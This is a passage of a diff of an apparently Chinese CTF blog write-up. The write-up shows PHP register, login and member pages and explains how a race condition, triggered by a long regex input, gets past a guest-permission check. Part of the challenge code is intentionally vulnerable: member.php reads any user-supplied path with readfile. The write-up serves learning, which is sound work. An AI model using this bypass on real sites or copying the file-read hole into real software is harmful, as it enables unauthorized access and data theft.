=&gt; $username, <span class="string">':password'</span> =&gt; $password]);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/^(sicnu)((?:#|\w)+)$/i'</span>, $code, $matches);</span><br><span class="line"><span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, :permit)'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':permit'</span> =&gt; $matches[<span class="number">1</span>]]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, "TERRIBLE")'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="log.html"&lt;/script&gt;'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;config.php&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">try</span>{</span><br><span class="line">$pdo = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&apos;mysql:host=localhost;dbname=***&apos;</span>, <span class="hljs-string">&apos;***&apos;</span>, <span class="hljs-string">&apos;***&apos;</span>);</span><br><span class="line">}<span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e){</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;mysql connected error&apos;</span>);</span><br><span class="line">}					<span class="hljs-comment">//str_shuffle()&#x968F;&#x673A;&#x5730;&#x6253;&#x4E71;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;</span></span><br><span class="line">$admin = <span class="hljs-string">&quot;sicnu&quot;</span>.<span class="hljs-string">&quot;#&quot;</span>.str_shuffle(<span class="hljs-string">&apos;hello_here_is_your_flag_but_it_no_easy&apos;</span>);</span><br><span class="line">$username = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;username&apos;</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">&apos;username&apos;</span>] !== <span class="hljs-string">&apos;&apos;</span>) ? (string)$_POST[<span class="hljs-string">&apos;username&apos;</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Missing username&apos;</span>);</span><br><span class="line">$password = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;password&apos;</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">&apos;password&apos;</span>] !== <span class="hljs-string">&apos;&apos;</span>) ? (string)$_POST[<span class="hljs-string">&apos;password&apos;</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Missing password&apos;</span>);</span><br><span class="line">$code = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;code&apos;</span>]) === <span class="hljs-keyword">true</span>) ? (string)$_POST[<span class="hljs-string">&apos;code&apos;</span>] : <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (strlen($username) &gt; <span class="hljs-number">16</span> || strlen($username) &gt; <span class="hljs-number">16</span>) {</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;is too long&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;SELECT username FROM users WHERE username = :username&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($sth-&gt;fetch() !== <span class="hljs-keyword">false</span>) {</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;username has been registered&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;INSERT INTO users (username, password) VALUES (:username, :password)&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username, <span class="hljs-string">&apos;:password&apos;</span> =&gt; $password]);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="hljs-string">&apos;/^(sicnu)((?:#|\w)+)$/i&apos;</span>, $code, $matches);</span><br><span class="line"><span class="hljs-keyword">if</span> (count($matches) === <span class="hljs-number">3</span> &amp;&amp; $admin === $matches[<span class="hljs-number">0</span>]) {</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;INSERT INTO inspect (username, permit) VALUES (:username, :permit)&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username, <span class="hljs-string">&apos;:permit&apos;</span> =&gt; $matches[<span class="hljs-number">1</span>]]);</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;INSERT INTO inspect (username, permit) VALUES (:username, &quot;TERRIBLE&quot;)&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username]);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;log.html&quot;&lt;/script&gt;&apos;</span>; </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>Log.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=***'</span>, <span class="string">'***'</span>, <span class="string">'***'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">$password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'is too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Error in username or password'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</span><br><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</span><br><span class="line"><span class="comment">#echo $username;</span></span><br><span class="line">header(<span class="string">"Location: member.php"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;config.php&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">try</span>{</span><br><span class="line">$pdo = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&apos;mysql:host=localhost;dbname=***&apos;</span>, <span class="hljs-string">&apos;***&apos;</span>, <span class="hljs-string">&apos;***&apos;</span>);</span><br><span class="line">}<span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e){</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;mysql connected error&apos;</span>);</span><br><span class="line">}</span><br><span class="line">$username = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;username&apos;</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">&apos;username&apos;</span>] !== <span class="hljs-string">&apos;&apos;</span>) ? (string)$_POST[<span class="hljs-string">&apos;username&apos;</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Missing username&apos;</span>);</span><br><span class="line">$password = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;password&apos;</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">&apos;password&apos;</span>] !== <span class="hljs-string">&apos;&apos;</span>) ? (string)$_POST[<span class="hljs-string">&apos;password&apos;</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Missing password&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (strlen($username) &gt; <span class="hljs-number">32</span> || strlen($password) &gt; <span class="hljs-number">32</span>) {</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;is too long&apos;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;SELECT password FROM users WHERE username = :username&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($sth-&gt;fetch()[<span class="hljs-number">0</span>] !== $password) {</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Error in username or password&apos;</span>);</span><br><span class="line">}</span><br><span class="line">$_SESSION[<span class="hljs-string">&apos;username&apos;</span>] = $username;</span><br><span class="line"><span class="hljs-keyword">unset</span>($_SESSION[<span class="hljs-string">&apos;is_logined&apos;</span>]);</span><br><span class="line"><span class="hljs-keyword">unset</span>($_SESSION[<span class="hljs-string">&apos;is_guest&apos;</span>]);</span><br><span class="line"><span class="hljs-comment">#echo $username;</span></span><br><span class="line">header(<span class="hljs-string">&quot;Location: member.php&quot;</span>); </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>Member.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'please login first'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=***'</span>, <span class="string">'***'</span>, <span class="string">'***'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT permit FROM inspect WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'TERRIBLE'</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no no no!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line"><span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">readfile($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>拿到Flag的关键在于要绕过一个is_guest判断。</p>
-<p>member.php源码处：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT permit FROM inspect WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'TERRIBLE'</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>而TERRIBLE是在注册时写入的，在register.php源码中：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_match(<span class="string">'/^(sicnu)((?:#|\w)+)$/i'</span>, $code, $matches);</span><br><span class="line"><span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, :permit)'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':permit'</span> =&gt; $matches[<span class="number">1</span>]]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, "TERRIBLE")'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>先进行了一个正则匹配，再进行了if语句，其中一个条件为<code>$admin === $matches[0]</code></p>
-<p>根据前面的<code>$admin = &quot;sicnu&quot;.&quot;#&quot;.str_shuffle(&#39;hello_here_is_your_flag_but_it_no_easy&#39;);</code> 可知,admin的值为一个随机值，这里只能进行绕过。</p>
-<p>这里可以利用条件竞争绕过</p>
-<p>正则表达式的意义如图所示</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;config.php&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;username&apos;</span>]) === <span class="hljs-keyword">false</span>) {</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;please login first&apos;</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">try</span>{</span><br><span class="line">$pdo = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&apos;mysql:host=localhost;dbname=***&apos;</span>, <span class="hljs-string">&apos;***&apos;</span>, <span class="hljs-string">&apos;***&apos;</span>);</span><br><span class="line">}<span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e){</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;mysql connected error&apos;</span>);</span><br><span class="line">}</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;SELECT permit FROM inspect WHERE username = :username&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $_SESSION[<span class="hljs-string">&apos;username&apos;</span>]]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($sth-&gt;fetch()[<span class="hljs-number">0</span>] === <span class="hljs-string">&apos;TERRIBLE&apos;</span>) {</span><br><span class="line">$_SESSION[<span class="hljs-string">&apos;is_guest&apos;</span>] = <span class="hljs-keyword">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="hljs-string">&apos;is_logined&apos;</span>] = <span class="hljs-keyword">true</span>;</span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;is_logined&apos;</span>]) === <span class="hljs-keyword">false</span> || <span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&apos;is_guest&apos;</span>]) === <span class="hljs-keyword">true</span>) {</span><br><span class="line">	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no no no!&quot;</span>;</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;file&apos;</span>])===<span class="hljs-keyword">false</span>)</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;</span><br><span class="line"><span class="hljs-keyword">elseif</span>(is_file($_GET[<span class="hljs-string">&apos;file&apos;</span>]))</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you cannot give me a file&quot;</span>;</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">readfile($_GET[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x62FF;&#x5230;Flag&#x7684;&#x5173;&#x952E;&#x5728;&#x4E8E;&#x8981;&#x7ED5;&#x8FC7;&#x4E00;&#x4E2A;is_guest&#x5224;&#x65AD;&#x3002;</p>
+<p>member.php&#x6E90;&#x7801;&#x5904;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;SELECT permit FROM inspect WHERE username = :username&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $_SESSION[<span class="hljs-string">&apos;username&apos;</span>]]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($sth-&gt;fetch()[<span class="hljs-number">0</span>] === <span class="hljs-string">&apos;TERRIBLE&apos;</span>) {</span><br><span class="line">$_SESSION[<span class="hljs-string">&apos;is_guest&apos;</span>] = <span class="hljs-keyword">true</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x800C;TERRIBLE&#x662F;&#x5728;&#x6CE8;&#x518C;&#x65F6;&#x5199;&#x5165;&#x7684;&#xFF0C;&#x5728;register.php&#x6E90;&#x7801;&#x4E2D;&#xFF1A;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">preg_match(<span class="hljs-string">&apos;/^(sicnu)((?:#|\w)+)$/i&apos;</span>, $code, $matches);</span><br><span class="line"><span class="hljs-keyword">if</span> (count($matches) === <span class="hljs-number">3</span> &amp;&amp; $admin === $matches[<span class="hljs-number">0</span>]) {</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;INSERT INTO inspect (username, permit) VALUES (:username, :permit)&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username, <span class="hljs-string">&apos;:permit&apos;</span> =&gt; $matches[<span class="hljs-number">1</span>]]);</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="hljs-string">&apos;INSERT INTO inspect (username, permit) VALUES (:username, &quot;TERRIBLE&quot;)&apos;</span>);</span><br><span class="line">$sth-&gt;execute([<span class="hljs-string">&apos;:username&apos;</span> =&gt; $username]);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5148;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x6B63;&#x5219;&#x5339;&#x914D;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x4E86;if&#x8BED;&#x53E5;&#xFF0C;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x6761;&#x4EF6;&#x4E3A;<code>$admin === $matches[0]</code></p>
+<p>&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;<code>$admin = &quot;sicnu&quot;.&quot;#&quot;.str_shuffle(&apos;hello_here_is_your_flag_but_it_no_easy&apos;);</code> &#x53EF;&#x77E5;,admin&#x7684;&#x503C;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x503C;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x80FD;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x7ED5;&#x8FC7;</p>
+<p>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x610F;&#x4E49;&#x5982;&#x56FE;&#x6240;&#x793A;</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24a10415b69935.jpg" alt="web4_zhengze.jpg"></p>
-<p>如果在#号后面赋值非常长的一段字符，在php匹配的时长会消耗资源（拖延时间）导<br>致后面的语句暂时无法执行。也就无法将permit字段设置为TERRIBLE。</p>
-<p>因为前面已经注册了账号，所以这里就可以绕过is_guest的判断。</p>
-<p>正常注册登录提示：no no no!</p>
+<p>&#x5982;&#x679C;&#x5728;#&#x53F7;&#x540E;&#x9762;&#x8D4B;&#x503C;&#x975E;&#x5E38;&#x957F;&#x7684;&#x4E00;&#x6BB5;&#x5B57;&#x7B26;&#xFF0C;&#x5728;php&#x5339;&#x914D;&#x7684;&#x65F6;&#x957F;&#x4F1A;&#x6D88;&#x8017;&#x8D44;&#x6E90;&#xFF08;&#x62D6;&#x5EF6;&#x65F6;&#x95F4;&#xFF09;&#x5BFC;<br>&#x81F4;&#x540E;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x6682;&#x65F6;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x3002;&#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x5C06;permit&#x5B57;&#x6BB5;&#x8BBE;&#x7F6E;&#x4E3A;TERRIBLE&#x3002;</p>
+<p>&#x56E0;&#x4E3A;&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x6CE8;&#x518C;&#x4E86;&#x8D26;&#x53F7;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;is_guest&#x7684;&#x5224;&#x65AD;&#x3002;</p>
+<p>&#x6B63;&#x5E38;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#x63D0;&#x793A;&#xFF1A;no no no!</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24a10052a43128.jpg" alt="web4_nonono.jpg"></p>
-<p>重新注册一个账号，code处赋值为长字符串：</p>
+<p>&#x91CD;&#x65B0;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;code&#x5904;&#x8D4B;&#x503C;&#x4E3A;&#x957F;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24a11e9be38274.jpg" alt="web4_reg.jpg"></p>
-<p>重新登录,显示no，说明已经绕过is_guest</p>
